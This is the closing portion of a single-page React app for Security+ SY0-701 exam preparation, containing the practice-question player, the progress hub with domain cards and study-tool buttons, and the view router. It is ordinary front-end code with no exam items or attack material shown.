    return (
      <div style={{ padding: 24, maxWidth: 600, margin: '0 auto' }}>
        <Card style={{ textAlign: 'center', marginBottom: 24 }}>
          <div style={{ fontSize: 64, marginBottom: 16 }}>{percentage >= 80 ? '🎉' : '📚'}</div>
          <h2 style={{ color: percentage >= 80 ? colors.success : colors.warning }}>
            {percentage >= 80 ? 'Excellent Work!' : 'Keep Practicing'}
          </h2>
          <p style={{ fontSize: 36, fontWeight: 700, marginTop: 16 }}>{score}/{maxScore}</p>
          <p style={{ color: colors.textSecondary }}>{percentage}% Score</p>
        </Card>
        <Button onClick={() => setView({ type: 'hub' })} size="lg" style={{ width: '100%' }}>Return to Hub</Button>
      </div>
    );
  }

  return (
    <div style={{ padding: 24, maxWidth: 800, margin: '0 auto' }}>
      <div style={{ marginBottom: 20 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8, fontSize: 13, color: colors.textSecondary }}>
          <span>PBQ {currentPBQ + 1} of {allPBQs.length}</span>
          <span>Score: {score}</span>
        </div>
        <ProgressBar value={currentPBQ + 1} max={allPBQs.length} color={colors.accent} />
      </div>

      <Card style={{ marginBottom: 20 }}>
        <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 12 }}>
          <Badge color={getDomainColor(pbq.domain)}>Domain {pbq.domain}</Badge>
          <Badge color={colors.textMuted}>{pbq.points} points</Badge>
        </div>
        
        <h3 style={{ marginBottom: 12 }}>{pbq.title}</h3>
        <div style={{ padding: 12, background: colors.bgElevated, borderRadius: 8, marginBottom: 16, whiteSpace: 'pre-wrap', fontFamily: 'monospace', fontSize: 13 }}>
          {pbq.scenario}
        </div>
        <p style={{ fontWeight: 500, marginBottom: 16 }}>{pbq.task}</p>

        {pbq.type === 'multi-select' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {pbq.options.map(opt => {
              const isSelected = (answers[pbq.id] || []).includes(opt.id);
              let bg = colors.bgElevated, border = colors.border;
              
              if (submitted) {
                if (opt.correct) { bg = `${colors.success}20`; border = colors.success; }
                else if (isSelected) { bg = `${colors.error}20`; border = colors.error; }
              } else if (isSelected) {
                bg = `${colors.accent}20`; border = colors.accent;
              }

              return (
                <button key={opt.id} onClick={() => handleMultiSelect(opt.id)}
                  style={{ padding: 12, background: bg, border: `2px solid ${border}`, borderRadius: 8, textAlign: 'left', cursor: submitted ? 'default' : 'pointer', color: colors.textPrimary }}>
                  <span style={{ marginRight: 8 }}>{isSelected ? '☑' : '☐'}</span>
                  {opt.text}
                </button>
              );
            })}
          </div>
        )}

        {pbq.type === 'ordering' && (
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            {dragItems.map((item, index) => {
              const isCorrect = item.order === index + 1;
              let bg = colors.bgElevated, border = colors.border;
              
              if (submitted) {
                bg = isCorrect ? `${colors.success}20` : `${colors.error}20`;
                border = isCorrect ? colors.success : colors.error;
              }

              return (
                <div key={item.id} style={{ display: 'flex', gap: 8, alignItems: 'center' }}>
                  <div style={{ display: 'flex', flexDirection: 'column', gap: 2 }}>
                    <button onClick={() => index > 0 && handleOrderChange(index, index - 1)} disabled={submitted || index === 0}
                      style={{ padding: '2px 8px', background: colors.bgElevated, border: `1px solid ${colors.border}`, borderRadius: 4, cursor: submitted || index === 0 ? 'default' : 'pointer', color: colors.textSecondary }}>↑</button>
                    <button onClick={() => index < dragItems.length - 1 && handleOrderChange(index, index + 1)} disabled={submitted || index === dragItems.length - 1}
                      style={{ padding: '2px 8px', background: colors.bgElevated, border: `1px solid ${colors.border}`, borderRadius: 4, cursor: submitted || index === dragItems.length - 1 ? 'default' : 'pointer', color: colors.textSecondary }}>↓</button>
                  </div>
                  <div style={{ flex: 1, padding: 12, background: bg, border: `2px solid ${border}`, borderRadius: 8 }}>
                    <span style={{ fontWeight: 600, marginRight: 8 }}>{index + 1}.</span>
                    {item.text}
                    {submitted && <span style={{ float: 'right', color: isCorrect ? colors.success : colors.error }}>{isCorrect ? '✓' : `(→${item.order})`}</span>}
                  </div>
                </div>
              );
            })}
          </div>
        )}
      </Card>

      {submitted && (
        <Card style={{ marginBottom: 20, borderLeft: `3px solid ${colors.info}` }}>
          <h4 style={{ marginBottom: 8, color: colors.info }}>Explanation</h4>
          <p style={{ color: colors.textSecondary, fontSize: 14, lineHeight: 1.6 }}>{pbq.explanation}</p>
        </Card>
      )}

      <div style={{ display: 'flex', gap: 12 }}>
        {!submitted ? (
          <Button onClick={handleSubmit} style={{ flex: 1 }}>Submit Answer</Button>
        ) : (
          <Button onClick={handleNext} style={{ flex: 1 }}>
            {currentPBQ < allPBQs.length - 1 ? 'Next PBQ →' : 'View Results'}
          </Button>
        )}
      </div>
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// FINAL HUB WITH ALL FEATURES
// ═══════════════════════════════════════════════════════════════
const HubFinal = ({ progress, setView }) => {
  const domains = [1, 2, 3, 4, 5];
  const weights = { 1: 12, 2: 22, 3: 18, 4: 28, 5: 20 };

  const getDomainProgress = (domain) => {
    const lessons = LESSON_DATA.filter(l => l.domain === domain);
    const sims = SIMULATION_DATA.filter(s => s.domain === domain);
    const completedLessons = lessons.filter(l => progress.lessonProgress?.[l.id]?.completed).length;
    const completedSims = sims.filter(s => progress.simProgress?.[s.id]?.completed).length;
    const total = lessons.length + sims.length;
    const completed = completedLessons + completedSims;
    return { lessons: lessons.length, completedLessons, sims: sims.length, completedSims, total, completed, percent: total ? Math.round((completed / total) * 100) : 0 };
  };

  const totalProgress = domains.reduce((sum, d) => sum + getDomainProgress(d).completed, 0);
  const totalItems = domains.reduce((sum, d) => sum + getDomainProgress(d).total, 0);

  return (
    <div style={{ padding: 24, maxWidth: 1000, margin: '0 auto' }} className="slide-up">
      <div style={{ textAlign: 'center', marginBottom: 32 }}>
        <h1 style={{ fontSize: 28, fontWeight: 700, marginBottom: 8 }}>Security+ SY0-701 Training</h1>
        <p style={{ color: colors.textSecondary }}>Complete lessons and simulations to prepare for your certification</p>
        <div style={{ marginTop: 16 }}>
          <ProgressBar value={totalProgress} max={totalItems} color={colors.accent} height={10} />
          <p style={{ marginTop: 8, fontSize: 14, color: colors.textMuted }}>{totalProgress} of {totalItems} items completed ({totalItems ? Math.round((totalProgress / totalItems) * 100) : 0}%)</p>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(280px, 1fr))', gap: 16, marginBottom: 32 }}>
        {domains.map(domain => {
          const dp = getDomainProgress(domain);
          const color = getDomainColor(domain);
          
          return (
            <Card key={domain} style={{ cursor: 'pointer', transition: 'transform 0.2s, border-color 0.2s', borderColor: 'transparent' }}
              onClick={() => setView({ type: 'domain', domain })}
              onMouseEnter={e => { e.currentTarget.style.transform = 'translateY(-4px)'; e.currentTarget.style.borderColor = color; }}
              onMouseLeave={e => { e.currentTarget.style.transform = 'translateY(0)'; e.currentTarget.style.borderColor = 'transparent'; }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'flex-start', marginBottom: 12 }}>
                <Badge color={color}>Domain {domain}</Badge>
                <span style={{ fontSize: 13, color: colors.textMuted }}>{weights[domain]}%</span>
              </div>
              <h3 style={{ fontSize: 16, marginBottom: 8 }}>{getDomainName(domain)}</h3>
              <div style={{ marginBottom: 12 }}>
                <ProgressBar value={dp.completed} max={dp.total} color={color} />
              </div>
              <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: 13, color: colors.textSecondary }}>
                <span>📚 {dp.completedLessons}/{dp.lessons}</span>
                <span>🎮 {dp.completedSims}/{dp.sims}</span>
              </div>
            </Card>
          );
        })}
      </div>

      {/* Study Tools */}
      <h2 style={{ fontSize: 18, marginBottom: 16 }}>📋 Study Tools</h2>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(150px, 1fr))', gap: 12, marginBottom: 24 }}>
        <Button onClick={() => setView({ type: 'practice-exam' })} variant="secondary" style={{ width: '100%' }}>
          📝 Practice Exam
        </Button>
        <Button onClick={() => setView({ type: 'pbq' })} variant="secondary" style={{ width: '100%' }}>
          🔧 PBQs ({PBQ_DATA_EXTENDED.length})
        </Button>
        <Button onClick={() => setView({ type: 'flashcards' })} variant="secondary" style={{ width: '100%' }}>
          🎴 Flashcards
        </Button>
        <Button onClick={() => setView({ type: 'glossary' })} variant="secondary" style={{ width: '100%' }}>
          📖 Glossary
        </Button>
        <Button onClick={() => setView({ type: 'exam-readiness' })} variant="secondary" style={{ width: '100%' }}>
          🎯 Readiness
        </Button>
        <Button onClick={() => setView({ type: 'dashboard' })} variant="secondary" style={{ width: '100%' }}>
          📊 Dashboard
        </Button>
      </div>

      {/* Quick Stats */}
      <Card>
        <h3 style={{ marginBottom: 16 }}>📈 Platform Content</h3>
        <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(100px, 1fr))', gap: 16, textAlign: 'center' }}>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.accent }}>{LESSON_DATA.length}</div>
            <div style={{ fontSize: 11, color: colors.textMuted }}>Lessons</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.success }}>{SIMULATION_DATA.length}</div>
            <div style={{ fontSize: 11, color: colors.textMuted }}>Simulations</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.warning }}>{QUESTIONS.length}</div>
            <div style={{ fontSize: 11, color: colors.textMuted }}>Questions</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.info }}>{Object.keys(GLOSSARY).length}</div>
            <div style={{ fontSize: 11, color: colors.textMuted }}>Terms</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.domain5 }}>{FLASHCARD_DATA.length}</div>
            <div style={{ fontSize: 11, color: colors.textMuted }}>Flashcards</div>
          </div>
          <div>
            <div style={{ fontSize: 24, fontWeight: 700, color: colors.domain2 }}>{PBQ_DATA_EXTENDED.length}</div>
            <div style={{ fontSize: 11, color: colors.textMuted }}>PBQs</div>
          </div>
        </div>
      </Card>
    </div>
  );
};

// ═══════════════════════════════════════════════════════════════
// FINAL APP COMPONENT v8.2
// ═══════════════════════════════════════════════════════════════
const AppV82 = () => {
  const [view, setView] = useState({ type: 'hub' });
  const [progress, setProgress] = useState(loadProgress);

  const renderView = () => {
    switch (view.type) {
      case 'hub':
        return <HubFinal progress={progress} setView={setView} />;
      case 'domain':
        return <DomainView domain={view.domain} progress={progress} setView={setView} />;
      case 'lesson':
        return <LessonViewer lessonId={view.lessonId} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'simulation':
        return <SimulationPlayer simId={view.simId} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'quiz':
        return <QuizPlayer domain={view.domain} progress={progress} setProgress={setProgress} setView={setView} />;
      case 'dashboard':
        return <Dashboard progress={progress} setView={setView} />;
      case 'practice-exam':
        return <PracticeExam progress={progress} setProgress={setProgress} setView={setView} />;
      case 'glossary':
        return <Glossary setView={setView} />;
      case 'pbq':
        return <PBQPlayerUpdated progress={progress} setProgress={setProgress} setView={setView} />;
      case 'flashcards':
        return <Flashcards progress={progress} setProgress={setProgress} setView={setView} />;
      case 'exam-readiness':
        return <ExamReadiness progress={progress} setView={setView} />;
      default:
        return <HubFinal progress={progress} setView={setView} />;
    }
  };

  return (
    <div style={{ minHeight: '100vh', background: colors.bgPrimary }}>
      <NavBar view={view} setView={setView} progress={progress} />
      {renderView()}
    </div>
  );
};

ReactDOM.createRoot(document.getElementById('root')).render(<AppV82 />);
</script>
</body>
</html>
